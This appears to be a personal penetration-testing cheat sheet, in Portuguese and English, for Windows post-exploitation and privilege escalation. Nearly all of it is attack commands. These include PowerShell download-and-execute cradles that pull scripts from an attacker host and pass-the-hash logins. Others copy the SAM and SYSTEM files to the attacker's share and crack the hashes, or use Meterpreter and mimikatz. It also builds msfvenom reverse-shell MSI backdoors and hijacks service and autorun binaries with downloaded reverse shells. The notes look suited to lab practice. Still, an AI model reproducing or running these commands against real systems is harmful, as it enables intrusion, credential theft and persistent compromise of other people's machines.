*** Post Exploitation ***

===================== Find =====================

dir C:\ /s /p iis-85.png


====================== Basic Stuff =====================

-> Ver quando a máquina foi atualizada pela última vez(para pegar exploits compativeis)
	systeminfo
	HotFix

C:\Windows\System32\config -> Onde todas as senhas são armazenadas

xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.4.248

winexe -U 'admin%password123' --system  //192.168.1.22 cmd.exe

-> Pass The Hash

winexe -U 'admin%a9fdfa038c4b75ebc76dc855dd74f0da' --system  //192.168.1.22 cmd.exe

-> Powershell Execute in Our mAchine
	powershell "iex(new-object net.webclient).downloadString('http://10.10.14.52:8888/LocalPriv.ps1'); {{{{FUNCTION}}}}"
1. Exemplo de Arquivo LocalPriv.ps1 com FUnção Invoke-MS16-032
	powershell "iex(new-object net.webclient).downloadString('http://10.10.14.52:8888/LocalPriv.ps1'); Invoke-MS16-032"
	

================================= UAC Bypass ===========================

1. Ver se o retorno será 0x1
	REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

2. FodHelper, UACME or EventViewer PS1 scripts nos favoritos
	dir C:\system32\fodhelper.exe
	dir C:\system32\eventviewer.exe

=========================== Meterpreter =================================

-> Sugestor de Exploits pós-exploração
1. no meterpreter
	run post/multi/recon/local_exploit_suggester
2. depois do retorno : CTRL+Z e passos abaixo
	use FULL_PATH_FOR_EXPLOIT
	set SESSION NUMERO
	exploit
-> Interagir com a sessão pós meterpreter
	sessions SESSION NUMBER
-> Ver privilégios da sessão com meterpreter
	getprivs
	getsystem
-> Ver processos que temos alcance com a sessão do meterpreter
	ps
-> Migrar para um processo dentro do meterpreter (buscar migrar para processos root para obter privilégios de comandos como hashdump)
	migrate -N spoolsv.exewho
	migrate NUMBER
-> Carregar mimikatz dentro do meterpreter (O Help do meterpreter se expande para termos o menu)
	load kiwi (EVITAR USAR, GANhE SYSTEM E USE o x64 por transfer)

========================== Sherlock ============================

-> Fazendo com HTTP
1. On Kali, in the same directory as reverse.exe:
	python -m http.server --bind 10.10.14.52 8888
2. Fazer DOwnload e executar de forma que bypasse as politicas
	powershell "iex(new-object net.webclient).downloadString('http://10.10.15.187:8080/Sherlock.ps1');Find-AllVulns"


========================= PrivescCheck ===============================

-> Com o Powershell
	powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
	
-> Com exe
	windows-privesc-check2.exe --audit -a -o wpc-report

****************************************************************************************************

****************************************** WINPEAS *************************************************

****************************************************************************************************

-> The ouput will be colored using ansi colors. If you are executing winpeas.exe from a Windows console, you need to set a registry value to see the colors (and open a new CMD):
	REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1

========================= Password Registry ============================

-> Mapeando senhas vulneráveis com winPEAS
	> .\winPEASany.exe quiet filesinfo userinfo

-> Query para ver credenciais de autologon
	> reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

-> Query para ver credenciais de proxylogon
	> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
	
[+ Saved Credentials]

-> Listar os usuários com as credenciais salvas na máquina
	> cmdkey /list
	
-> Executar um programa com credenciais salvas
	> runas /savecred /user:admin C:\PrivEsc\reverse.exe
	
======================= Configuration Files ==============================

[+SAM and SYSTEM files]

The SAM and SYSTEM files can be used to extract user password hashes

-> Buscando arquivos de configuração com senhas no winPEAS
	> winPEASany.exe quiet cmd searchfast filesinfo 

-> Copiar os arquivos para o Kali e extrair as hashes
	> copy C:\Windows\Repair\SAM \\10.10.10.10\kali\
	> copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
	> python3 creddump7/pwdump.py SYSTEM SAM >> hash.txt

-> Quebrar as Hashes com Hashcat
	> hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt

================================= Service Exploits =======================================

Se nós conseguimos alterar a configuração de um serviço, mas não conseguimos dar Start ou Stop nele, não conseguiremos escalar privilégios a partir dele.


-> Mapeando serviços vulneráveis com winPEAS
	> .\winPEASany.exe quiet servicesinfo

[+ Insecure Service Permissions]

-> Start/Stop a service
	> net start/stop <name>

1. Ver se o serviço está rodando em nt authority/system ou nt authority/local
-> Query the configuration of a service
	> sc.exe qc <name>

-> Query the current status of a service
	> sc.exe query <name>

-> Modify a configuration option of a service
	> sc.exe config <name> <option>= <value> 

-> Checar quais usuários tem permissão de acesso sobre um serviço
	> accesschk.exe /accepteula -uwcqv user <servico>

-> Colocar um shell reverso ao invés de um outro serviço que rode com LocalSystem para nos dar Root Shell
	> sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
	
[+ Unquoted Service Path]

C:\\Program Files\Some Dir\SomepProgram.exe
-> Esse comando pode ter duas interpretações:
	1. Executar o SomepProgram.exe
	2. Executar o C:\\Program Files\Some com o Dir\SomepProgram.exe como argumento
	
Após identificar um Serviço Unquoted com o winPEAS :

Ex : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe

1. Passos iniciais
-> Checar se o Serviço roda em LocalSystem
	> sc.exe qc <servico>
-> Checar quais as configurações do serviço para vermos se podemos iniciá-lo e pará-lo
	> accesschk.exe /accepteula -ucqv <USER> <servico>

2. Checar as permissões de escrita do unquoted diretório em questão
	> accesschk.exe /accepteula -uwdq C:\
	> accesschk.exe /accepteula -uwdq "C:\Program Files\"
	> accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
	
3. Criar um revshell chamado <Primeiro Nome do Ultimo Diretorio Unquoted>.exe para colocar no diretório Unquoted Path Service e executar o serviço. No caso do exemplo : Common.exe PS : Se já existir o binário, copiar antes
	

========================= Registry Exploit ==============================

[+ Autorun]

Autorun são executáveis que são configurados para rodarem com System Privileges logo de cara

-> Se identificar Autorun com winpeas
	.\winPEASany.exe quiet servicesinfo
-> Checando as permissões de AutoRun
	.\accesschk.exe /accepteula -wvu "C:\Program Files\Program\program.exe"


1. Renomear o .exe do autorun para um .bak
	PS> rename-item enterprisesystemmanager.exe enterprisesystemmanager.bak
2. Colocar um novo .exe com revshell no lugar
	certutil.exe -urlcache -split -f http://10.1.1.246/OS-75961/Remote.exe enterprisesystemmanager.exe
3. Reiniciar o PC
	PS> Restart-Computer


[+ Always Install Elevated]

É uma configuração para sempre instalarmos um arquivo com elevated privileges. Sendo assim, basta criarmos um arquivo .msi a ser instalado pelo sistema para o Windows instalar um backdoor de revshell com sys priv

1. Buscar por Always Install Elevated Keys
	$ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
	$ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
2. Criar um windows installer com msfvenom
	$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
3. Instalar no sistema o revshell enquanto o kali está listening
	$ msiexec /quiet /qn /i C:\Users\Phoebe\Desktop\reverse.msi
	
====================== Scheduled Tasks and Insecure GUIs =============================

[+ Listar as tasks scheduladas do usuário]
	> schtasks /query /fo LIST /v
	
-> Podemos substituir o arquivo .exe da scheduled task por um revshell.exe, basta mover o arquivo e trocar o nome dele, depois fazer o mesmo com o revshell para o nome do comando em scheduled.

[+ Insecure GUI]
1. Procurar o aplicativo que está aberto
	> tasklist /V | findstr mspaint.exe
2. Abrir o Paint e abrir algum arquivo de interesse	
	> file > open > digitar o path > c:/windows/system32/cmd.exe
	> apertar enter
================================= Kernel Exploits ==================================

1. Enumerate Windows version / patch level
	$ systeminfo
2. Find Matching Exploits in ExploitDB

-> Windows Exploit Suggester (Utilizar a saida do comando systeminfo)
https://github.com/bitsadmin/wesng
	wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | more

-> Precompiled Kernel Exploits
https://github.com/SecWiki/windows-kernel-exploits
